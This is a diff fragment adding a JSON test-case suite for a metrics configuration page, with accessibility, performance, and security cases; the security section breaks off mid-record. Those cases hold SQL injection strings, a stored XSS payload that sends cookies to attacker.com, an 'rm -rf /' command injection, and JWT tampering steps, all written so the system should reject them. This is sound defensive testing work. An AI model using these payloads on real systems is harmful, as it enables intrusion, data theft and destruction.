+          "expectedResult": "Loading spinner appears, 'Save' button is disabled to prevent double-submission, UI shows 'Saving...' status"
+        },
+        {
+          "step": 3,
+          "action": "Wait for 30+ seconds while database connection times out",
+          "expectedResult": "After timeout period, error message appears: 'Unable to save metric due to connection timeout. Please try again.' Loading spinner disappears, 'Save' button becomes enabled again"
+        },
+        {
+          "step": 4,
+          "action": "Verify that form data is still populated with the entered values",
+          "expectedResult": "All form fields retain the entered data (name, description, formula), user does not lose their work"
+        },
+        {
+          "step": 5,
+          "action": "Click 'Save Metric' button again after connection is restored",
+          "expectedResult": "Metric saves successfully on retry, success message appears, metric appears in the list, no duplicate entries are created"
+        }
+      ],
+      "postconditions": [
+        "No partial or corrupted data is saved in the database during timeout",
+        "User's form data is preserved for retry",
+        "System handles timeout gracefully without crashing or freezing",
+        "Audit log records the failed attempt and successful retry with appropriate status codes"
+      ]
+    }
+  ],
+  "accessibility": [
+    {
+      "id": "TC-ACCE-001",
+      "title": "Complete keyboard navigation through metrics configuration page without mouse",
+      "category": "Accessibility",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page",
+        "Page contains predefined metrics dropdown, custom metric creation form, and existing metrics list",
+        "Screen reader is not active for this test (pure keyboard navigation)"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Press Tab key from page load to navigate through all interactive elements",
+          "expectedResult": "Focus moves sequentially through: 'Select Predefined Metrics' dropdown, 'Create Custom Metric' button, existing metrics list items, edit buttons, delete buttons. Focus indicator is clearly visible (2px solid border with 3:1 contrast ratio)"
+        },
+        {
+          "step": 2,
+          "action": "Press Enter key when focus is on 'Create Custom Metric' button",
+          "expectedResult": "Custom metric form opens, focus automatically moves to the first input field ('Metric Name'), form is fully accessible via keyboard"
+        },
+        {
+          "step": 3,
+          "action": "Press Tab to navigate through form fields: Metric Name, Description, Formula, Category dropdown, Tags input",
+          "expectedResult": "Focus moves logically through all form fields in order, each field shows clear focus indicator, no focus traps occur"
+        },
+        {
+          "step": 4,
+          "action": "Use Arrow keys to navigate within the Category dropdown when focused",
+          "expectedResult": "Up/Down arrow keys move through dropdown options, Enter key selects the highlighted option, Escape key closes dropdown without selection"
+        },
+        {
+          "step": 5,
+          "action": "Press Tab to reach 'Save Metric' button and press Enter",
+          "expectedResult": "Metric is saved, success message appears and receives focus for announcement, focus returns to logical position (newly created metric in the list)"
+        },
+        {
+          "step": 6,
+          "action": "Press Shift+Tab to navigate backwards through the page",
+          "expectedResult": "Focus moves in reverse order through all interactive elements, no elements are skipped, focus order is logical and predictable"
+        },
+        {
+          "step": 7,
+          "action": "Navigate to an existing metric's 'Delete' button using Tab, press Enter, then press Tab to reach 'Confirm' in the confirmation dialog and press Enter",
+          "expectedResult": "Delete confirmation dialog opens and is keyboard accessible, focus is trapped within dialog, Escape key cancels deletion, Enter on 'Confirm' deletes metric, focus returns to metrics list after deletion"
+        }
+      ],
+      "postconditions": [
+        "All functionality is accessible via keyboard without requiring mouse",
+        "Focus order is logical and follows visual layout",
+        "No keyboard traps prevent user from navigating away",
+        "Focus indicators meet WCAG 2.1 Level AA requirements (minimum 3:1 contrast ratio)"
+      ]
+    },
+    {
+      "id": "TC-ACCE-002",
+      "title": "Screen reader announces all elements, states, and changes correctly",
+      "category": "Accessibility",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "NVDA or JAWS screen reader is active and running",
+        "User is on the metrics configuration page",
+        "Page has proper ARIA labels, roles, and live regions implemented"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Navigate to the metrics configuration page with screen reader active",
+          "expectedResult": "Screen reader announces page title 'Metrics Configuration', main heading 'Configure Performance Metrics', and page landmark 'main content region'"
+        },
+        {
+          "step": 2,
+          "action": "Tab to 'Select Predefined Metrics' dropdown",
+          "expectedResult": "Screen reader announces: 'Select Predefined Metrics, combobox, collapsed' with instruction 'Press Alt+Down arrow to expand'"
+        },
+        {
+          "step": 3,
+          "action": "Tab to 'Create Custom Metric' button and activate it",
+          "expectedResult": "Screen reader announces: 'Create Custom Metric, button' then announces 'Custom metric form, dialog opened' when form appears"
+        },
+        {
+          "step": 4,
+          "action": "Tab through form fields in the custom metric creation form",
+          "expectedResult": "Each field is announced with label, type, required status, and current value: 'Metric Name, edit text, required, blank', 'Description, edit text, optional, blank', 'Formula, edit text, required, blank'"
+        },
+        {
+          "step": 5,
+          "action": "Enter invalid data in Formula field and tab away",
+          "expectedResult": "Screen reader announces error: 'Formula, invalid entry, Error: Invalid formula syntax. Please use valid operators and field names.'"
+        },
+        {
+          "step": 6,
+          "action": "Correct the formula, fill all required fields, and activate 'Save Metric' button",
+          "expectedResult": "Screen reader announces: 'Saving metric' (from aria-live region), then 'Success: Metric successfully created' (polite announcement), focus moves to new metric in list with announcement 'New metric added to list'"
+        },
+        {
+          "step": 7,
+          "action": "Navigate to existing metric in the list",
+          "expectedResult": "Screen reader announces: 'Sales Performance Metric, list item 1 of 5, with actions: Edit button, Delete button'"
+        },
+        {
+          "step": 8,
+          "action": "Activate 'Delete' button on a metric",
+          "expectedResult": "Screen reader announces: 'Delete confirmation dialog, Are you sure you want to delete Sales Performance Metric? This action cannot be undone. Confirm button, Cancel button'"
+        }
+      ],
+      "postconditions": [
+        "All interactive elements have proper ARIA labels and roles",
+        "State changes are announced via aria-live regions",
+        "Error messages are associated with form fields and announced",
+        "Dynamic content updates are communicated to screen reader users"
+      ]
+    },
+    {
+      "id": "TC-ACCE-003",
+      "title": "Verify color contrast ratios meet WCAG 2.1 Level AA standards throughout metrics configuration interface",
+      "category": "Accessibility",
+      "priority": "High",
+      "preconditions": [
+        "User is on the metrics configuration page",
+        "Color contrast analyzer tool is available (e.g., browser extension or WAVE tool)",
+        "Page displays all UI states: default, hover, focus, active, disabled, error",
+        "Both light and dark theme modes are available for testing"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Use color contrast analyzer to check normal text (body text, labels, descriptions) against background",
+          "expectedResult": "All normal text has minimum contrast ratio of 4.5:1 against background, analyzer shows 'Pass' for WCAG AA standard"
+        },
+        {
+          "step": 2,
+          "action": "Check large text (headings, button text 18pt+) contrast ratios",
+          "expectedResult": "All large text has minimum contrast ratio of 3:1 against background, meets WCAG AA requirements"
+        },
+        {
+          "step": 3,
+          "action": "Check interactive elements in default state: buttons, input borders, dropdown borders",
+          "expectedResult": "All interactive element borders and UI components have minimum 3:1 contrast ratio against adjacent colors"
+        },
+        {
+          "step": 4,
+          "action": "Hover over buttons and interactive elements, check hover state contrast",
+          "expectedResult": "Hover states maintain minimum 4.5:1 contrast for text and 3:1 for UI components, color change is not the only indicator of hover state"
+        },
+        {
+          "step": 5,
+          "action": "Check focus indicators on all interactive elements",
+          "expectedResult": "Focus indicators have minimum 3:1 contrast ratio against background and against the focused element, focus ring is clearly visible"
+        },
+        {
+          "step": 6,
+          "action": "Check error messages and error state styling (red text, error icons)",
+          "expectedResult": "Error text has 4.5:1 contrast ratio, error indication does not rely solely on color (includes icon or text label), error borders have 3:1 contrast"
+        },
+        {
+          "step": 7,
+          "action": "Check disabled state elements (disabled buttons, inactive metrics)",
+          "expectedResult": "Disabled elements are visually distinguishable but may have lower contrast (WCAG allows exemption), disabled state is indicated by more than just color (e.g., opacity, cursor change)"
+        },
+        {
+          "step": 8,
+          "action": "Switch to dark theme mode and repeat contrast checks for all elements",
+          "expectedResult": "Dark theme maintains all WCAG AA contrast requirements, all text and UI components remain clearly visible and meet minimum contrast ratios"
+        }
+      ],
+      "postconditions": [
+        "All text content meets WCAG 2.1 Level AA contrast requirements (4.5:1 for normal, 3:1 for large)",
+        "All UI components and interactive elements meet 3:1 contrast requirement",
+        "Color is not used as the only means of conveying information",
+        "Both light and dark themes are accessible and meet contrast standards"
+      ]
+    },
+    {
+      "id": "TC-ACCE-004",
+      "title": "Test page functionality and readability at 200% browser zoom level",
+      "category": "Accessibility",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page at 100% zoom",
+        "Browser is set to default zoom level (100%)",
+        "Page contains multiple metrics in the list and all UI components visible"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Increase browser zoom to 200% using Ctrl++ (Windows) or Cmd++ (Mac)",
+          "expectedResult": "Page scales proportionally, all content remains visible, no horizontal scrolling is required for main content area (vertical scrolling is acceptable)"
+        },
+        {
+          "step": 2,
+          "action": "Verify all text is readable and not truncated at 200% zoom",
+          "expectedResult": "All labels, button text, metric names, descriptions, and form field labels are fully visible and readable, no text is cut off or overlapping"
+        },
+        {
+          "step": 3,
+          "action": "Navigate through the page using Tab key at 200% zoom",
+          "expectedResult": "Focus indicators remain visible and are not cut off by viewport, focused elements scroll into view automatically if needed"
+        },
+        {
+          "step": 4,
+          "action": "Open 'Select Predefined Metrics' dropdown at 200% zoom",
+          "expectedResult": "Dropdown opens and displays correctly, all options are readable, dropdown does not extend beyond viewport or cause layout issues"
+        },
+        {
+          "step": 5,
+          "action": "Click 'Create Custom Metric' button and fill out the form at 200% zoom",
+          "expectedResult": "Form opens and is fully functional, all input fields are accessible and usable, field labels remain associated with inputs, no overlapping elements"
+        },
+        {
+          "step": 6,
+          "action": "Scroll through the metrics list at 200% zoom",
+          "expectedResult": "List scrolls smoothly, all metrics are accessible, edit and delete buttons remain visible and clickable, no content is hidden or inaccessible"
+        },
+        {
+          "step": 7,
+          "action": "Test responsive behavior by resizing browser window at 200% zoom",
+          "expectedResult": "Page adapts responsively, maintains usability, no critical functionality is lost, mobile breakpoints trigger appropriately if window is narrowed"
+        }
+      ],
+      "postconditions": [
+        "All functionality remains accessible at 200% zoom level",
+        "No loss of content or functionality occurs due to zooming",
+        "Page meets WCAG 2.1 Success Criterion 1.4.4 (Resize text)",
+        "Layout remains usable without requiring horizontal scrolling for main content"
+      ]
+    },
+    {
+      "id": "TC-ACCE-005",
+      "title": "Verify proper focus management in modal dialogs and dynamic content updates",
+      "category": "Accessibility",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "User is on the metrics configuration page",
+        "Page contains metrics that can be edited and deleted (triggering modal dialogs)",
+        "Keyboard navigation is being used"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Use Tab key to navigate to 'Create Custom Metric' button and press Enter",
+          "expectedResult": "Custom metric form modal opens, focus automatically moves to the first input field ('Metric Name'), focus is trapped within the modal (Tab does not move focus outside modal)"
+        },
+        {
+          "step": 2,
+          "action": "Press Tab repeatedly to cycle through all focusable elements in the modal",
+          "expectedResult": "Focus cycles through: Metric Name field, Description field, Formula field, Category dropdown, Tags field, Save button, Cancel button, then returns to Metric Name field (focus trap is active)"
+        },
+        {
+          "step": 3,
+          "action": "Press Escape key while modal is open",
+          "expectedResult": "Modal closes, focus returns to the 'Create Custom Metric' button that originally opened the modal"
+        },
+        {
+          "step": 4,
+          "action": "Navigate to an existing metric's 'Delete' button using Tab and press Enter",
+          "expectedResult": "Delete confirmation dialog opens, focus moves to the 'Cancel' button (safe default), dialog has role='alertdialog' and proper ARIA labels"
+        },
+        {
+          "step": 5,
+          "action": "Press Tab to move focus to 'Confirm' button and press Enter to delete the metric",
+          "expectedResult": "Metric is deleted, dialog closes, focus returns to the metrics list at the position where the deleted metric was (or next available metric), success message appears in aria-live region"
+        },
+        {
+          "step": 6,
+          "action": "Navigate to 'Edit' button on a metric and press Enter",
+          "expectedResult": "Edit form modal opens with metric data pre-populated, focus moves to the first editable field, focus trap is active within edit modal"
+        },
+        {
+          "step": 7,
+          "action": "Make changes and press Tab to reach 'Save' button, then press Enter",
+          "expectedResult": "Changes are saved, modal closes, focus returns to the 'Edit' button of the updated metric, success message is announced via aria-live region"
+        },
+        {
+          "step": 8,
+          "action": "Test focus behavior when validation errors occur: open create form, leave required fields empty, press Save",
+          "expectedResult": "Form does not close, focus moves to the first field with an error, error message is announced by screen reader, error is visually indicated with icon and text"
+        }
+      ],
+      "postconditions": [
+        "Focus is properly managed in all modal dialogs (trapped when open, returned when closed)",
+        "Focus returns to logical position after modal closes (triggering element or relevant content)",
+        "No focus is lost or moved to unexpected locations",
+        "All modals have proper ARIA roles (dialog or alertdialog) and labels"
+      ]
+    },
+    {
+      "id": "TC-ACCE-006",
+      "title": "Test mobile accessibility with touch targets and screen reader on mobile device",
+      "category": "Accessibility",
+      "priority": "Medium",
+      "preconditions": [
+        "User is logged in as Performance Analyst on a mobile device (iOS or Android)",
+        "Mobile screen reader is active (VoiceOver on iOS or TalkBack on Android)",
+        "User is on the metrics configuration page in mobile view",
+        "Page is responsive and adapts to mobile viewport (375px width)"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Verify all interactive elements (buttons, links, form fields) have minimum touch target size",
+          "expectedResult": "All touch targets are at least 44x44 CSS pixels (iOS) or 48x48 dp (Android), adequate spacing exists between adjacent touch targets (minimum 8px)"
+        },
+        {
+          "step": 2,
+          "action": "Use screen reader swipe gestures to navigate through the page (swipe right to move forward)",
+          "expectedResult": "Screen reader announces each element in logical order: page title, headings, buttons, metrics list items, all content is accessible via swipe navigation"
+        },
+        {
+          "step": 3,
+          "action": "Double-tap on 'Create Custom Metric' button with screen reader active",
+          "expectedResult": "Screen reader announces 'Create Custom Metric, button' then 'activated', form modal opens, screen reader announces modal opening and focuses first field"
+        },
+        {
+          "step": 4,
+          "action": "Use screen reader to navigate through form fields in the custom metric creation form",
+          "expectedResult": "Each form field is announced with label, type, and required status, virtual keyboard appears when text fields are focused, keyboard type is appropriate (text, number, etc.)"
+        },
+        {
+          "step": 5,
+          "action": "Test dropdown interaction with screen reader: focus on Category dropdown and double-tap to open",
+          "expectedResult": "Dropdown opens, screen reader announces 'Category, combobox, expanded', swipe gestures navigate through options, double-tap selects option"
+        },
+        {
+          "step": 6,
+          "action": "Test pinch-to-zoom gesture on the page",
+          "expectedResult": "Page allows pinch-to-zoom up to 200%, content reflows appropriately, no content is cut off or becomes inaccessible, viewport meta tag does not prevent zooming"
+        },
+        {
+          "step": 7,
+          "action": "Navigate to metrics list and test swipe actions on list items (if implemented)",
+          "expectedResult": "Swipe actions (e.g., swipe left to delete) are announced by screen reader with instructions, alternative methods exist for users who cannot perform swipe gestures (e.g., long-press menu)"
+        },
+        {
+          "step": 8,
+          "action": "Test orientation change: rotate device from portrait to landscape",
+          "expectedResult": "Page adapts to new orientation, all content remains accessible, focus position is maintained, screen reader continues to function correctly"
+        }
+      ],
+      "postconditions": [
+        "All touch targets meet minimum size requirements (44x44px or 48x48dp)",
+        "Mobile screen readers can access all functionality",
+        "Page supports pinch-to-zoom without content loss",
+        "Orientation changes do not break functionality or accessibility"
+      ]
+    },
+    {
+      "id": "TC-ACCE-007",
+      "title": "Verify ARIA live regions announce dynamic content changes appropriately",
+      "category": "Accessibility",
+      "priority": "High",
+      "preconditions": [
+        "User is logged in as Performance Analyst",
+        "Screen reader (NVDA or JAWS) is active",
+        "User is on the metrics configuration page",
+        "Page has ARIA live regions implemented for success messages, error messages, and loading states"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Create a new custom metric by filling the form and clicking 'Save Metric'",
+          "expectedResult": "Screen reader announces 'Saving metric' from aria-live='polite' region during save operation, then announces 'Success: Metric successfully created' when save completes, announcement is clear and not interrupted"
+        },
+        {
+          "step": 2,
+          "action": "Attempt to create a metric with duplicate name (validation error)",
+          "expectedResult": "Screen reader announces error message 'Error: A metric with this name already exists. Please choose a different name.' from aria-live='assertive' region immediately, error is also associated with the Metric Name field"
+        },
+        {
+          "step": 3,
+          "action": "Edit an existing metric and save changes",
+          "expectedResult": "Screen reader announces 'Updating metric' during save, then 'Success: Metric updated successfully' when complete, updated metric information is announced if focus moves to it"
+        },
+        {
+          "step": 4,
+          "action": "Delete a metric using the Delete button and confirm deletion",
+          "expectedResult": "Screen reader announces 'Deleting metric' during deletion, then 'Success: Metric deleted successfully' when complete, announcement includes metric name for context"
+        },
+        {
+          "step": 5,
+          "action": "Select multiple predefined metrics from dropdown (if multi-select is supported)",
+          "expectedResult": "Screen reader announces each selection: 'Sales Metric added' or 'Revenue Metric removed', counter updates are announced: 'X metrics selected'"
+        },
+        {
+          "step": 6,
+          "action": "Trigger a system error (e.g., network disconnection during save)",
+          "expectedResult": "Screen reader announces error from aria-live='assertive' region: 'Error: Unable to save metric. Please check your connection and try again.', error is announced immediately and clearly"
+        },
+        {
+          "step": 7,
+          "action": "Test loading state: navigate to metrics configuration page with slow connection",
+          "expectedResult": "Screen reader announces 'Loading metrics' from aria-live='polite' region, then announces 'Metrics loaded, X metrics available' when loading completes"
+        },
+        {
+          "step": 8,
+          "action": "Verify that rapid changes do not cause announcement overload",
+          "expectedResult": "If multiple changes occur rapidly, aria-live='polite' regions queue announcements appropriately without interrupting each other, most recent/important message takes priority"
+        }
+      ],
+      "postconditions": [
+        "All dynamic content changes are announced to screen reader users",
+        "ARIA live regions use appropriate politeness levels (assertive for errors, polite for status updates)",
+        "Announcements are clear, concise, and provide sufficient context",
+        "Rapid changes are handled gracefully without overwhelming users with announcements"
+      ]
+    }
+  ],
+  "performance": [
+    {
+      "id": "PERF-LOAD-001",
+      "title": "Validate metrics configuration page load performance under concurrent user load",
+      "category": "performance",
+      "subCategory": "Load Testing",
+      "priority": "Critical",
+      "description": "Test the metrics configuration page load time and API response time when 100 concurrent Performance Analysts access the page simultaneously. Validate that the page loads under 2 seconds as per technical requirements and measure system resource utilization.",
+      "preconditions": [
+        "Metrics database is populated with 500 predefined metrics",
+        "Test environment is configured with production-equivalent infrastructure",
+        "100 test user accounts with Performance Analyst role are created",
+        "Monitoring tools are configured to capture response times, CPU, and memory metrics"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Configure load testing tool (JMeter/LoadRunner) to simulate 100 concurrent users accessing the metrics configuration page",
+          "expectedResult": "Load test configuration is successfully created with 100 virtual users"
+        },
+        {
+          "step": 2,
+          "action": "Execute load test with ramp-up period of 30 seconds and sustain load for 10 minutes",
+          "expectedResult": "All 100 users successfully navigate to metrics configuration page without connection errors"
+        },
+        {
+          "step": 3,
+          "action": "Measure and record page load time (P50, P95, P99 percentiles) for metrics configuration page",
+          "expectedResult": "P50 ≤ 1.5s, P95 ≤ 2.0s, P99 ≤ 2.5s for page load time"
+        },
+        {
+          "step": 4,
+          "action": "Monitor GET /api/metrics/configure endpoint response times during the test",
+          "expectedResult": "API response time P95 ≤ 1.5s, P99 ≤ 2.0s with throughput ≥ 10 TPS"
+        },
+        {
+          "step": 5,
+          "action": "Capture CPU and memory utilization on application and database servers",
+          "expectedResult": "CPU utilization ≤ 70%, Memory utilization ≤ 75%, no memory leaks detected"
+        },
+        {
+          "step": 6,
+          "action": "Verify error rate across all requests during the load test",
+          "expectedResult": "Error rate ≤ 0.1% (less than 1 error per 1000 requests)"
+        }
+      ],
+      "postconditions": [
+        "System returns to normal state after load test completion",
+        "No database connection pool exhaustion",
+        "All test users are logged out",
+        "Performance metrics are captured and stored for analysis"
+      ],
+      "testData": "100 Performance Analyst user credentials, 500 predefined metrics in database",
+      "toolsRequired": [
+        "Apache JMeter or LoadRunner",
+        "Application Performance Monitoring (APM) tool - New Relic/Dynatrace",
+        "Database monitoring tool",
+        "Server resource monitoring - Grafana/Prometheus"
+      ],
+      "estimatedTime": "45 minutes",
+      "automationFeasibility": "High",
+      "riskScore": null,
+      "complianceTag": null
+    },
+    {
+      "id": "PERF-STRESS-001",
+      "title": "Determine breaking point for POST /api/metrics/configure endpoint under extreme concurrent metric creation load",
+      "category": "performance",
+      "subCategory": "Stress Testing",
+      "priority": "High",
+      "description": "Identify the system breaking point by progressively increasing concurrent users creating custom metrics via POST /api/metrics/configure endpoint. Validate graceful degradation, error handling, and system recovery capabilities when pushed beyond normal capacity.",
+      "preconditions": [
+        "Baseline performance metrics are established from load testing",
+        "System is in healthy state with no existing load",
+        "Database has capacity for at least 10,000 new metric entries",
+        "Circuit breaker and rate limiting mechanisms are configured",
+        "Monitoring and alerting systems are active"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Configure stress test to start with 50 concurrent users and increase by 50 users every 2 minutes until system failure",
+          "expectedResult": "Stress test configuration is ready with incremental load pattern"
+        },
+        {
+          "step": 2,
+          "action": "Execute stress test where each user continuously creates custom metrics via POST /api/metrics/configure",
+          "expectedResult": "Load increases progressively: 50, 100, 150, 200, 250+ concurrent users"
+        },
+        {
+          "step": 3,
+          "action": "Monitor response times and identify when P95 exceeds 5 seconds or error rate exceeds 5%",
+          "expectedResult": "Breaking point is identified (expected around 200-300 concurrent users based on 2s requirement)"
+        },
+        {
+          "step": 4,
+          "action": "Verify system exhibits graceful degradation with appropriate HTTP status codes (429 Too Many Requests, 503 Service Unavailable)",
+          "expectedResult": "System returns proper error codes instead of crashes, circuit breaker activates if configured"
+        },
+        {
+          "step": 5,
+          "action": "Observe database connection pool, thread pool, and memory utilization at breaking point",
+          "expectedResult": "Resource exhaustion point identified: connection pool saturation, CPU >90%, or memory >85%"
+        },
+        {
+          "step": 6,
+          "action": "Stop the load and monitor system recovery time to normal operational state",
+          "expectedResult": "System recovers within 5 minutes, all services return to healthy state, no data corruption"
+        }
+      ],
+      "postconditions": [
+        "System is fully recovered and operational",
+        "Database integrity is verified with no orphaned or corrupted metric records",
+        "Breaking point threshold is documented",
+        "Capacity planning recommendations are generated"
+      ],
+      "testData": "Variable number of custom metric payloads with unique names (metric_custom_001 to metric_custom_N)",
+      "toolsRequired": [
+        "Apache JMeter with Ultimate Thread Group plugin",
+        "APM tool for real-time monitoring",
+        "Database connection pool monitoring",
+        "Log aggregation tool - ELK Stack/Splunk"
+      ],
+      "estimatedTime": "60 minutes",
+      "automationFeasibility": "High",
+      "riskScore": null,
+      "complianceTag": null
+    },
+    {
+      "id": "PERF-SPIKE-001",
+      "title": "Validate system behavior during sudden spike from 10 to 200 concurrent users configuring metrics",
+      "category": "performance",
+      "subCategory": "Spike Testing",
+      "priority": "Critical",
+      "description": "Test system response to sudden traffic surge where user load spikes from 10 baseline users to 200 concurrent users within 10 seconds, simulating a scenario where multiple teams simultaneously access metrics configuration. Validate auto-scaling, caching effectiveness, and performance degradation during spike.",
+      "preconditions": [
+        "Auto-scaling policies are configured (if applicable)",
+        "Caching layer is enabled for metrics retrieval",
+        "System is running with 10 baseline concurrent users",
+        "Database connection pool has minimum 50 connections available",
+        "Load balancer health checks are configured"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Establish baseline load with 10 concurrent users performing mixed operations (view metrics, create custom metrics, edit metrics)",
+          "expectedResult": "Baseline established with stable response times: P95 < 2s, error rate < 0.1%"
+        },
+        {
+          "step": 2,
+          "action": "Trigger sudden spike by adding 190 additional concurrent users within 10 seconds (total 200 users)",
+          "expectedResult": "Load increases from 10 to 200 users in 10-second window"
+        },
+        {
+          "step": 3,
+          "action": "Measure response time degradation during first 30 seconds of spike for GET and POST /api/metrics/configure",
+          "expectedResult": "Response time P95 remains ≤ 4s during spike, P99 ≤ 6s, no complete service outage"
+        },
+        {
+          "step": 4,
+          "action": "Monitor auto-scaling triggers and instance provisioning time (if cloud-based)",
+          "expectedResult": "Auto-scaling triggers within 60 seconds, new instances become healthy within 2-3 minutes"
+        },
+        {
+          "step": 5,
+          "action": "Verify cache hit ratio and database query performance during spike",
+          "expectedResult": "Cache hit ratio ≥ 70% for metric retrieval, database query time increases by ≤ 50% from baseline"
+        },
+        {
+          "step": 6,
+          "action": "Sustain 200 users for 5 minutes, then drop back to 10 users within 10 seconds",
+          "expectedResult": "System stabilizes at high load, then gracefully handles load decrease without errors"
+        },
+        {
+          "step": 7,
+          "action": "Verify error rate and transaction success rate throughout the spike test",
+          "expectedResult": "Error rate ≤ 2% during spike, ≥ 98% of transactions complete successfully"
+        }
+      ],
+      "postconditions": [
+        "System returns to baseline performance levels within 2 minutes after spike ends",
+        "No memory leaks or resource exhaustion detected",
+        "All created/modified metrics are persisted correctly",
+        "Auto-scaled instances are scaled down appropriately (if applicable)"
+      ],
+      "testData": "200 user credentials, 1000 predefined metrics, 200 unique custom metric payloads for creation",
+      "toolsRequired": [
+        "Apache JMeter with Stepping Thread Group",
+        "Cloud monitoring console (AWS CloudWatch/Azure Monitor) for auto-scaling observation",
+        "Redis/Cache monitoring tool",
+        "Real-time APM dashboard"
+      ],
+      "estimatedTime": "40 minutes",
+      "automationFeasibility": "High",
+      "riskScore": null,
+      "complianceTag": null
+    }
+  ],
+  "security": [
+    {
+      "id": "SEC-ELEV-001",
+      "title": "Unauthorized Access to Metric Configuration via Privilege Escalation",
+      "category": "security",
+      "subCategory": "STRIDE-Elevation of Privilege",
+      "priority": "Critical",
+      "description": "Verify that users without Performance Analyst role cannot access or modify metric configurations by manipulating role parameters, session tokens, or direct API calls. This tests for broken access control (OWASP A01) and elevation of privilege vulnerabilities.",
+      "preconditions": [
+        "Application is deployed with role-based access control enabled",
+        "Test user accounts exist with different roles (Performance Analyst, Regular User, Guest)",
+        "Metrics configuration endpoint POST /api/metrics/configure is active",
+        "Valid authentication tokens are available for different user roles"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Authenticate as a Regular User (non-Performance Analyst role) and capture the session token",
+          "expectedResult": "User successfully authenticates with Regular User credentials and receives valid session token"
+        },
+        {
+          "step": 2,
+          "action": "Attempt to navigate directly to the metrics configuration page URL (/metrics/configure) using the Regular User session",
+          "expectedResult": "Access is denied with HTTP 403 Forbidden error and user is redirected to unauthorized access page"
+        },
+        {
+          "step": 3,
+          "action": "Send a direct POST request to /api/metrics/configure endpoint with Regular User token attempting to create a custom metric with payload: {\"metricName\": \"CustomMetric1\", \"formula\": \"SUM(sales)\", \"userId\": \"regularUser123\"}",
+          "expectedResult": "API returns HTTP 403 Forbidden with error message 'Insufficient privileges to configure metrics' and no metric is created"
+        },
+        {
+          "step": 4,
+          "action": "Attempt to modify the session token by adding role parameter {\"role\": \"Performance Analyst\"} or manipulating JWT claims to escalate privileges",
+          "expectedResult": "Modified token is rejected with HTTP 401 Unauthorized error due to invalid signature or token tampering detection"
+        },
+        {
+          "step": 5,
+          "action": "Attempt horizontal privilege escalation by using Performance Analyst A's valid token to modify Performance Analyst B's metric configurations via API call with different userId parameter",
+          "expectedResult": "API validates token ownership and returns HTTP 403 Forbidden, preventing cross-user metric modification"
+        },
+        {
+          "step": 6,
+          "action": "Verify audit logs capture all unauthorized access attempts with timestamp, user ID, attempted action, and IP address",
+          "expectedResult": "Security audit log contains entries for all failed authorization attempts with complete details for incident response"
+        }
+      ],
+      "postconditions": [
+        "No unauthorized metric configurations are created or modified",
+        "All unauthorized access attempts are logged in security audit trail",
+        "User roles and permissions remain unchanged",
+        "System security posture is maintained"
+      ],
+      "testData": "Regular User credentials: {username: 'testuser@company.com', password: 'Test@1234', role: 'Regular User'}, Performance Analyst credentials: {username: 'analyst1@company.com', password: 'Analyst@5678', role: 'Performance Analyst'}, Malicious payload: {\"metricName\": \"MaliciousMetric\", \"formula\": \"DROP TABLE metrics--\"}",
+      "toolsRequired": [
+        "Burp Suite Professional or OWASP ZAP for request interception",
+        "Postman or cURL for API testing",
+        "JWT decoder tool (jwt.io)",
+        "Browser Developer Tools for session manipulation"
+      ],
+      "estimatedTime": "45 minutes",
+      "automationFeasibility": "High",
+      "riskScore": 9.2,
+      "complianceTag": "OWASP-A01, SOC2-CC6.1, PCI-DSS-7.1"
+    },
+    {
+      "id": "SEC-INJ-001",
+      "title": "SQL Injection and XSS Attacks via Custom Metric Configuration Fields",
+      "category": "security",
+      "subCategory": "OWASP-A03-Injection",
+      "priority": "Critical",
+      "description": "Validate that all input fields in metric configuration (metric name, formula, description) are properly sanitized and parameterized to prevent SQL injection, stored XSS, and command injection attacks. Tests OWASP A03 injection vulnerabilities and data tampering (STRIDE).",
+      "preconditions": [
+        "User is authenticated as Performance Analyst with valid session",
+        "Metrics configuration page is accessible",
+        "Database connection is active",
+        "Input validation and sanitization mechanisms are implemented"
+      ],
+      "steps": [
+        {
+          "step": 1,
+          "action": "Navigate to metrics configuration page and attempt to create a custom metric with SQL injection payload in metric name field: \"TestMetric'; DROP TABLE metrics; --\"",
+          "expectedResult": "Input is rejected or sanitized, error message displays 'Invalid characters in metric name', no SQL command is executed, and metrics table remains intact"
+        },
+        {
+          "step": 2,
+          "action": "Attempt SQL injection via formula field with payload: \"SUM(sales) WHERE 1=1 UNION SELECT username, password FROM users--\" and submit the configuration",
+          "expectedResult": "Parameterized queries prevent SQL execution, input validation rejects the malformed formula, and no sensitive data is exposed in response"
+        },
+        {
+          "step": 3,
+          "action": "Test stored XSS by entering script payload in metric description field: \"<script>alert('XSS');document.location='http://attacker.com/steal?cookie='+document.cookie</script>\" and save the metric",
+          "expectedResult": "Input is HTML-encoded/sanitized before storage, script tags are escaped as &lt;script&gt;, and no JavaScript execution occurs when metric is displayed"
+        },
+        {
+          "step": 4,
+          "action": "Attempt reflected XSS via URL parameter manipulation: /metrics/configure?metricId=<img src=x onerror=alert('XSS')> and observe page rendering",
+          "expectedResult": "URL parameters are sanitized, Content-Security-Policy headers prevent inline script execution, and malicious payload is rendered as plain text"
+        },
+        {
+          "step": 5,
+          "action": "Test command injection in formula field with payload: \"SUM(sales); exec('rm -rf /'); --\" to attempt OS command execution",
+          "expectedResult": "Input validation restricts formula to mathematical expressions only, special characters are blocked, and no system commands are executed"
+        },
+        {
+          "step": 6,
+          "action": "Verify database queries use prepared statements by reviewing application logs and attempting blind SQL injection with time-based payload: \"TestMetric' AND SLEEP(10)--\"",
+          "expectedResult": "Response time remains under 2 seconds (normal load time), confirming parameterized queries prevent SQL injection execution"
+        }
+      ],
+      "postconditions": [
+        "Database integrity is maintained with no tables dropped or modified",
